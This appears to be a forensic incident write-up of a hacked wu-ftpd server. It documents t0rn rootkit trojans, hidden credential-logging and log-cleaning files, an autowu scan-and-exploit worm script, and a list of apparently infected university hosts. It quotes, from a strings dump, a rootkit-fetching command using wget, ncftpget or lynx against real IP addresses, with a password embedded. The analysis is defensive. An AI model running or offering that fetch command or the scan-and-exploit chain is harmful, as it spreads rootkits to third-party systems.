It had previously been running wu-ftpd:
220 macaulay.math.uiuc.edu FTP server (Version wu-2.6.0(1) Thu Oct 21 12:27:00 EDT 1999) ready.

Logging into the machine, some preliminary work shows that it was hacked
sometime around 9am Feb 4.

Lots of files were trojaned; many left with uid/gid 1042/1037.  So to get
a basic idea of what was changed, we do a
find / -user 1042
/bin/ls
/bin/netstat
/bin/ps
/bin/.../bash
/dev/tux/ssh2/hostkey
/dev/tux/ssh2/hostkey.pub
/dev/tux/ssh2/logo
/dev/tux/ssh2/random_seed
/lib/ldd.so/tks
/lib/ldd.so/tkp
/lib/ldd.so/tksb
/lib/lidps1.so
/sbin/ifconfig
/usr/bin/md5sum
/usr/bin/dir
/usr/bin/find
/usr/bin/top
/usr/bin/pstree
/usr/bin/slocate
/usr/include/file.h
/usr/include/hosts.h
/usr/include/log.h
/usr/include/proc.h
/usr/sbin/lsof
/.../awu
/.../awu/awu
/.../awu/wu
/.../awu/Makefile
/.../awu/auto

So we find we can't trust many of our utilities, including ps, ls, etc.

Also of interest:
/lib/lidps1.so contains the text:
xntps
tk

This is presumably a list of what NOT to show us using the trojaned ps.
Indeed, we find
/lib/ldd.so/tks		executable
/lib/ldd.so/tkp		logs user/pass combinations
/lib/ldd.so/tksb	log cleaner
as files that wouldn't want to be seen.  (It is noteworthy that ls can't
display them, either.)

But the real goodies are in /.../awu
There the file 128 shows that all of 128.11-128.254 was to be scanned,
basically by calling awu repeatedly.
The file awu is a shell script that does the following:
 - runs pscan2 on a class B network looking for answers on port 21
 - runs ssvuln on machines that answered to get the ftp banner message
 - runs oops on the outfile (exploits each machine in turn)
It is noteworthy that this machine seems to have found 1313 vulnerable
machines while it scanned!  If it automatically exploits them and repeats,
it might be considered to be a worm.

awu (autowu) was made in 2002 by riksta of [OPTIC]
Compiled on this machine on Feb 4 17:45, so most likely required human
interaction.  (The t0rn rootkit was installed automatically at 9:04.)

I'm not entirely certain of the purpose of the awu.list file.  Presumably
it stores the names of infected machines.  Contents are:
128.42.57.153 paprika.mems.rice.edu
128.61.36.113 r36h113.res.gatech.edu
128.82.226.65 modestus.cee.odu.edu
128.83.143.50 boniperti.csres.utexas.edu
128.83.143.78 nlp01.csres.utexas.edu

A strings on ss shows where it gets the rootkit from:
echo 1 ; if [ -f /usr/bin/wget ] ; then /usr/bin/wget http://136.176.52.62/rk.tgz ; else if [ -f /usr/bin/ncftpget ] ; then /usr/bin/ncftpget ftp://maaiman:gokvcvz3@128.210.138.107/rk.tgz ; else if [ -f /usr/bin/lynx ] ; then /usr/bin/lynx -dump http://136.176.52.62/rk.tgz >> rk.tgz ; fi ; fi ; fi


~spiroff/.cl had eggdrop in it, and a crontab to keep it running

running it and sniffing the computer's reaction gives:

Checking more thoroughly shows it actually wants to connect to several
other machines:

So these are apparently vulnerable boxes that were likely already exploited.
